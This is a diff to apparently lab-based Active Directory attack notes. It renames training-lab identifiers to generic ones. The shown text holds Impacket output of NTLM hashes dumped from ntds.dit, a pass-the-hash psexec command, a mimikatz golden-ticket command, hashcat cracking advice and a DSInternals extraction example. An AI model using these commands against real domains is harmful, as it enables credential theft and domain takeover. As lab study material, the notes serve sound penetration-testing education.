@@ -280,9 +280,9 @@ Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corpo
 [*] Reading and decrypting hashes from ntds.dit
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
-htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
 svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 ```
@@ -295,7 +295,7 @@ The `LMhash` field is usually `aad3b435b51404eeaad3b435b51404ee` (empty LM hash)
 
 - **Administrator (RID 500)** - Pass-the-hash to any system. `psexec.py -hashes :NTHASH DOMAIN/Administrator@target`.
 - **krbtgt (RID 502)** - Generate golden tickets with `mimikatz`: `kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ptt`. The golden ticket lets you impersonate any user in the domain without their password.
-- **Computer accounts (RID 1000+)** - These end in `$` (e.g., `WINLPE-DC01$`). Useful for AD CS abuse, certificate-based escalation, and various lateral-movement tricks.
+- **Computer accounts (RID 1000+)** - These end in `$` (e.g., `DC01$`). Useful for AD CS abuse, certificate-based escalation, and various lateral-movement tricks.
 - **All accounts** - Feed the hashes through hashcat (mode 1000 for NTLM) to recover plaintext passwords; often reveals password-reuse patterns across the org.
 
 ### DSInternals as alternative extractor
@@ -305,9 +305,9 @@ The PowerShell [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) m
 ```powershell
 PS> Import-Module .\DSInternals.psd1
 PS> $key = Get-BootKey -SystemHivePath .\SYSTEM
-PS> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+PS> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=example,DC=local' -DBPath .\ntds.dit -BootKey $key
 
-DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+DistinguishedName: CN=Administrator,CN=Users,DC=EXAMPLE,DC=LOCAL
 Sid: S-1-5-21-669053619-2741956077-1013132368-500
 SamAccountName: Administrator
 SamAccountType: User
